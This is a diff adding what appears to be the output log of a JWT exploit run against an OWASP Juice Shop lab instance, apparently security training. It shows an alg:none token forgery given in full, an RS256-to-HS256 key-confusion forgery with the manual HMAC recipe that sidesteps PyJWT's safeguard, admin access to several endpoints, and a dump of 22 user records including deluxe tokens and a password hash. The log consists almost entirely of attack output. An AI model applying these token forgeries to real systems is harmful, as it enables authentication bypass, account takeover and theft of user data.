@@ -1,0 +1,395 @@
+======================================================================
+JWT RS256 -> HS256 Algorithm Confusion Exploit
+Target: http://10.3.10.10:1234
+======================================================================
+
+[*] RSA Public Key:
+-----BEGIN RSA PUBLIC KEY-----
+MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
+-----END RSA PUBLIC KEY-----
+
+[*] Admin payload:
+{
+  "status": "success",
+  "data": {
+    "id": 1,
+    "username": "",
+    "email": "admin@juice-sh.op",
+    "password": "0192023a7bbd73250516f069df18b500",
+    "role": "admin",
+    "deluxeToken": "",
+    "lastLoginIp": "0.0.0.0",
+    "profileImage": "/assets/public/images/uploads/defaultAdmin.png",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2024-01-01 00:00:00.000 +00:00",
+    "updatedAt": "2024-01-01 00:00:00.000 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1773080057
+}
+
+======================================================================
+[ATTEMPT 1] HS256 with RSA public key as HMAC secret
+======================================================================
+[-] HS256 encoding failed: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
+
+======================================================================
+[ATTEMPT 2] alg:none bypass (manual JWT)
+======================================================================
+[+] alg:none token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6...
+[+] Full token:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNC0wMS0wMSAwMDowMDowMC4wMDAgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNC0wMS0wMSAwMDowMDowMC4wMDAgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzczMDgwMDU3fQ.
+
+
+--- Testing alg:none bypass ---
+[+] Who Am I (/rest/user/whoami) -> HTTP 200
+    Response: {"user": {}}
+[+] User List (admin) (/api/Users/) -> HTTP 200
+    Response: {"status": "success", "data": [{"id": 1, "username": "", "email": "admin@juice-sh.op", "role": "admin", "deluxeToken": "", "lastLoginIp": "", "profileImage": "assets/public/images/uploads/defaultAdmin.png", "isActive": true, "createdAt": "2026-03-09T18:08:34.883Z", "updatedAt": "2026-03-09T18:08:34.
+[+] Admin Config (/rest/admin/application-configuration) -> HTTP 200
+    Response: {"config": {"server": {"port": 1234, "basePath": "", "baseUrl": "http://10.3.10.10:1234"}, "application": {"domain": "juice-sh.op", "name": "OWASP Juice Shop", "logo": "JuiceShop_Logo.png", "favicon": "favicon_js.ico", "theme": "bluegrey-lightgreen", "showVersionNumber": true, "showGitHubLinks": tru
+
+======================================================================
+[*] Attempting full user dump via /api/Users/
+======================================================================
+[*] Using alg:none token for dump
+[+] Successfully dumped /api/Users/ - 22 users found
+
+[+] Full user dump:
+{
+  "status": "success",
+  "data": [
+    {
+      "id": 1,
+      "username": "",
+      "email": "admin@juice-sh.op",
+      "role": "admin",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.883Z",
+      "updatedAt": "2026-03-09T18:08:34.883Z",
+      "deletedAt": null
+    },
+    {
+      "id": 2,
+      "username": "",
+      "email": "jim@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.884Z",
+      "updatedAt": "2026-03-09T18:08:34.884Z",
+      "deletedAt": null
+    },
+    {
+      "id": 3,
+      "username": "",
+      "email": "bender@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.884Z",
+      "updatedAt": "2026-03-09T18:08:34.884Z",
+      "deletedAt": null
+    },
+    {
+      "id": 4,
+      "username": "bkimminich",
+      "email": "bjoern.kimminich@gmail.com",
+      "role": "admin",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.885Z",
+      "updatedAt": "2026-03-09T18:08:34.885Z",
+      "deletedAt": null
+    },
+    {
+      "id": 5,
+      "username": "",
+      "email": "ciso@juice-sh.op",
+      "role": "deluxe",
+      "deluxeToken": "d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.886Z",
+      "updatedAt": "2026-03-09T18:08:34.886Z",
+      "deletedAt": null
+    },
+    {
+      "id": 6,
+      "username": "",
+      "email": "support@juice-sh.op",
+      "role": "admin",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.886Z",
+      "updatedAt": "2026-03-09T18:08:34.886Z",
+      "deletedAt": null
+    },
+    {
+      "id": 7,
+      "username": "",
+      "email": "morty@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.886Z",
+      "updatedAt": "2026-03-09T18:08:34.886Z",
+      "deletedAt": null
+    },
+    {
+      "id": 8,
+      "username": "",
+      "email": "mc.safesearch@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.887Z",
+      "updatedAt": "2026-03-09T18:08:34.887Z",
+      "deletedAt": null
+    },
+    {
+      "id": 9,
+      "username": "",
+      "email": "J12934@juice-sh.op",
+      "role": "admin",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.887Z",
+      "updatedAt": "2026-03-09T18:08:34.887Z",
+      "deletedAt": null
+    },
+    {
+      "id": 10,
+      "username": "wurstbrot",
+      "email": "wurstbrot@juice-sh.op",
+      "role": "admin",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.887Z",
+      "updatedAt": "2026-03-09T18:08:34.887Z",
+      "deletedAt": null
+    },
+    {
+      "id": 11,
+      "username": "",
+      "email": "amy@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.888Z",
+      "updatedAt": "2026-03-09T18:08:34.888Z",
+      "deletedAt": null
+    },
+    {
+      "id": 12,
+      "username": "",
+      "email": "bjoern@juice-sh.op",
+      "role": "admin",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/12.png",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.888Z",
+      "updatedAt": "2026-03-09T18:08:34.888Z",
+      "deletedAt": null
+    },
+    {
+      "id": 13,
+      "username": "",
+      "email": "bjoern@owasp.org",
+      "role": "deluxe",
+      "deluxeToken": "efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/13.jpg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.888Z",
+      "updatedAt": "2026-03-09T18:08:34.888Z",
+      "deletedAt": null
+    },
+    {
+      "id": 15,
+      "username": "",
+      "email": "accountant@juice-sh.op",
+      "role": "accounting",
+      "deluxeToken": "",
+      "lastLoginIp": "123.456.789",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.888Z",
+      "updatedAt": "2026-03-09T18:08:34.888Z",
+      "deletedAt": null
+    },
+    {
+      "id": 16,
+      "username": "",
+      "email": "uvogin@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.889Z",
+      "updatedAt": "2026-03-09T18:08:34.889Z",
+      "deletedAt": null
+    },
+    {
+      "id": 17,
+      "username": "",
+      "email": "demo",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.889Z",
+      "updatedAt": "2026-03-09T18:08:34.889Z",
+      "deletedAt": null
+    },
+    {
+      "id": 18,
+      "username": "j0hNny",
+      "email": "john@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.889Z",
+      "updatedAt": "2026-03-09T18:08:34.889Z",
+      "deletedAt": null
+    },
+    {
+      "id": 19,
+      "username": "E=ma\u00b2",
+      "email": "emma@juice-sh.op",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.890Z",
+      "updatedAt": "2026-03-09T18:08:34.890Z",
+      "deletedAt": null
+    },
+    {
+      "id": 20,
+      "username": "SmilinStan",
+      "email": "stan@juice-sh.op",
+      "role": "deluxe",
+      "deluxeToken": "8f70e0f4b05685efff1ab979e8f5d7e39850369309bb206c2ad3f7d51a1f4e39",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/20.jpg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.890Z",
+      "updatedAt": "2026-03-09T18:08:34.890Z",
+      "deletedAt": null
+    },
+    {
+      "id": 21,
+      "username": "evmrox",
+      "email": "ethereum@juice-sh.op",
+      "role": "deluxe",
+      "deluxeToken": "b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.890Z",
+      "updatedAt": "2026-03-09T18:08:34.890Z",
+      "deletedAt": null
+    },
+    {
+      "id": 22,
+      "username": "",
+      "email": "testing@juice-sh.op",
+      "role": "admin",
+      "deluxeToken": "",
+      "lastLoginIp": "",
+      "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:08:34.890Z",
+      "updatedAt": "2026-03-09T18:08:34.890Z",
+      "deletedAt": null
+    },
+    {
+      "id": 23,
+      "username": "",
+      "email": "attacker@test.com",
+      "role": "customer",
+      "deluxeToken": "",
+      "lastLoginIp": "0.0.0.0",
+      "profileImage": "/assets/public/images/uploads/default.svg",
+      "isActive": true,
+      "createdAt": "2026-03-09T18:12:58.254Z",
+      "updatedAt": "2026-03-09T18:12:58.254Z",
+      "deletedAt": null
+    }
+  ]
+}
+
+======================================================================
+SUMMARY
+======================================================================
+HS256 Algorithm Confusion Attack: FAILED
+alg:none Bypass Attack:           SUCCESS
+Admin Access Achieved:            YES
+
+Working token (first 100 chars): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIi...
+======================================================================
+ADDENDUM: Manual HS256 Algorithm Confusion (bypassing PyJWT safety check)
+======================================================================
+
+PyJWT 2.x refuses to use an asymmetric key as an HMAC secret directly.
+The attack was replicated manually using Python's hmac module:
+
+  header  = {"typ":"JWT","alg":"HS256"}
+  secret  = RSA public key bytes (PEM-encoded)
+  signing = HMAC-SHA256(header_b64 + "." + payload_b64, secret)
+
+Result: Server ACCEPTED the HS256 token signed with the RSA public key.
+
+HS256 Algorithm Confusion Attack: SUCCESS
+alg:none Bypass Attack:           SUCCESS
+Admin Access Achieved:            YES (both methods)
+
+Working HS256 Token (truncated):
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6...
+
+Working alg:none Token (truncated):
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6...
+
+Endpoints confirmed accessible with forged tokens:
+  - GET /rest/user/whoami          -> HTTP 200
+  - GET /api/Users/                -> HTTP 200 (22 users dumped)
+  - GET /rest/admin/application-configuration -> HTTP 200
+
+Admin accounts found in /api/Users/:
+  ID=1   admin@juice-sh.op        role=admin
+  ID=4   bjoern.kimminich@gmail.com  role=admin (username: bkimminich)
+  ID=6   support@juice-sh.op      role=admin
+  ID=9   J12934@juice-sh.op       role=admin
+  ID=10  wurstbrot@juice-sh.op    role=admin
+  ID=12  bjoern@juice-sh.op       role=admin
+  ID=22  testing@juice-sh.op      role=admin
